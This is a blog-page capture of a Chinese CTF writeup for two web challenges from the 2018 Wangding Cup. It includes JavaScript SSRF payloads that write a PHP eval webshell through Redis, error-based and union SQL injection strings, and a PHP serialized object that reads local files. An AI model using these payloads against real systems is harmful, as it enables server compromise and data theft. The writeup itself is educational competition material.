@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          网鼎杯writeup-web - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/08/网鼎杯writeup-web/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                          <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+                        
+                    </div>
+                    <h1>网鼎杯writeup-web</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-08-21
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉又是一对web狗极度不友好的比赛，一开始网络环境都是奔溃的，正紧能做题已经是最后两个半小时了。第二道题还是最后一个半小时放出来的，相当难受了。（i春秋真的可以升级下服务器了。。。</p>
+<p>不过spider这道反日爬虫的题目感觉还是很有意思的，加上最近刚学的xss和redis，决定还是好好复现一下</p>
+<h1 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h1><p>题目给了提示说是动态爬虫，一开始对这个不是很了解，大意应该就是自带js解析，类似于浏览器会自动加载js，然后再抓取里面的内容。毕竟这年头ajax那么流行，只抓纯html页面怕是没什么内容。</p>
+<p>可以写一个简单的测试样例</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"a"</span>);</span></span><br><span class="line"><span class="actionscript">	a.innerHTML = <span class="string">'test'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将这个html上传之后，可以看到获取到<code>a</code>标签内部的元素变成了<code>test</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/网鼎杯writeup-web/1.png" alt></p>
+<p>这样一来，就可以利用ajax请求，形成ssrf</p>
+<p>由于robots.txt里面有个<code>/get_sourcecode</code>的提示，但是直接访问的时候会显示只能从127.0.0.1访问</p>
+<p>于是就先利用爬虫获取下这个页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">	xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">		if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">		&#123;</span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.getElementById(<span class="string">"a"</span>).innerHTML =  xmlhttp.responseText;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="actionscript">	xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"/get_sourcecode"</span>);</span></span><br><span class="line">	xmlhttp.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样一来就获取到了源码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/网鼎杯writeup-web/2.png" alt></p>
+<p>（吐槽一下，那时候和队友就差不多做到这里，由于加了个btoa，然后返回的页面中有中文，就一直返回NULL，相当的难受了</p>
+<p>源码里面的逻辑感觉没什么好看的，主要就是一小段</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#hint</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'level=low_273eac1c'</span> <span class="keyword">not</span> <span class="keyword">in</span> content <span class="keyword">and</span> <span class="string">'dbfilename'</span> <span class="keyword">in</span> content.lower():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, msg=<span class="string">u'Warning: 发现恶意关键字'</span>)</span><br><span class="line"><span class="comment">#hint</span></span><br></pre></td></tr></table></figure>
+<p>就是在html文本中加入<code>level=low_273eac1c</code>就可以绕过恶意关键字的检测</p>
+<p>题目也有提示<code>redis</code>，接下来就是利用这个ssrf来攻击redis了</p>
+<p>这里有两个小trick</p>
+<ul>
+<li>redis是简单的数据流格式，以一行数据当作一条命令执行</li>
+<li>同源策略是浏览器对对方返回的数据进行了拦截，但请求实际已经发出</li>
+</ul>
+<p>这样，就可以利用ajax传送一个post数据给<code>127.0.0.1:6379</code>，从而盲打redis</p>
+<p>提示中8000端口存在apache，于是接下来就利用redis往<code>/var/www/html</code>中写入webshell</p>
+<p>为了能让我们的数据有回显，需要加上<code>header(&#39;Access-Control-Allow-Origin:*&#39;)</code>来防止同源策略阻止数据包的返回</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">level=low_273eac1c</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">	xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"http://127.0.0.1:6379"</span>);</span></span><br><span class="line"><span class="actionscript">	xmlhttp.send(<span class="string">"flushall"</span>+<span class="string">"\n"</span>+<span class="string">"config set dir /var/www/html/"</span>+<span class="string">"\n"</span>+<span class="string">"config set dbfilename shell.php"</span>+<span class="string">"\n"</span>+<span class="string">'set 1 "\\n\\n&lt;?php header(\'Access-Control-Allow-Origin:*\'); eval($_GET[0]);?&gt;\\n\\n"'</span>+<span class="string">"\n"</span>+<span class="string">"save"</span>+<span class="string">"\n"</span>+<span class="string">"quit"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后读取<code>flag.php</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">'test'</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">	xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="javascript">	        <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).innerHTML =  xmlhttp.responseText;</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="actionscript">	xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"http://127.0.0.1:8000/shell.php?0=echo%20file_get_contents('flag.php');"</span>);</span></span><br><span class="line">	xmlhttp.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>就可以获取到flag了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/网鼎杯writeup-web/3.png" alt></p>
+<p>自己后期在本地分析的时候，自己构造的数据包在本地可以成功，然而在比赛环境中总是写入不了shell，就很苦恼。折磨了好久，就暂时先放会把，后续有空再慢慢研究</p>
+<p>总而言之感觉这道题的思路还是很巧妙的，而且怎么感觉最近redis的题目有点多哈。。</p>
+<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>一开始扫出了<code>flag.php</code>和<code>user.php.bak</code></p>
+<p>由于注册时会自动访问你的博客内容，我和队友一致认为是ssrf任意文件读取</p>
+<p>何况<code>user.php.bak</code>中还给了防御的正则，于是就把精力放在了绕正则上</p>
+<p>最后比完老哥们说是到注入==、，其实一开始是有发现view.php会报错，但是没往注入想</p>
+<p>然后几乎约等于没过滤，不能用<code>union</code>就用报错，（感觉自己动不动就盲注的习惯要改改了，第一反应都是盲注</p>
+<p>然后payload什么的也很简单</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//837d5d8ffa2f44df8d886d0ce5324565b6dd49a0904e40c7.game.ichunqiu.com/view.php</span></span><br><span class="line">?no=<span class="number">-1</span> or (updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,substr((<span class="keyword">select</span> data <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">50</span>),<span class="string">'~'</span>),<span class="number">1</span>))<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p>数据库里找不到flag，后来想想是不是要新增一条<code>blog=file:///var/www/html/flag.php</code>的用户，但是好像没找到insert或者update注入的点</p>
+<p>等下师傅们writeup把。。</p>
+<hr>
+<p>好吧，看完了writeup 原来可以用<code>/**/</code>的方式绕过拦截<code>union</code>的waf，这样的话思路就比较清晰了。</p>
+<p>payload</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">http:</span><span class="comment">//f37db81cf64d47b6b64c8f50bb032d2abfd66b829a434eae.game.ichunqiu.com/view.php</span></span><br><span class="line">?no=-1/**/union/**/select 1,2,3,'O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">1</span>:<span class="string">"a"</span>;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">i:</span><span class="number">18</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"blog"</span>;<span class="string">s:</span><span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;<span class="string">' #</span></span><br></pre></td></tr></table></figure>
+<p>就可以进行任意文件的读取了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/网鼎杯writeup-web/4.png" alt></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉比赛的时候思路还是比较闭塞，没有打开。而且确实和大佬们有点差距，好好学习去了。。</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/08/xss知识点小记/" data-toggle="tooltip" data-placement="top" title="xss知识点小记">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/08/xss练习记录/" data-toggle="tooltip" data-placement="top" title="xss练习记录">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                          <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
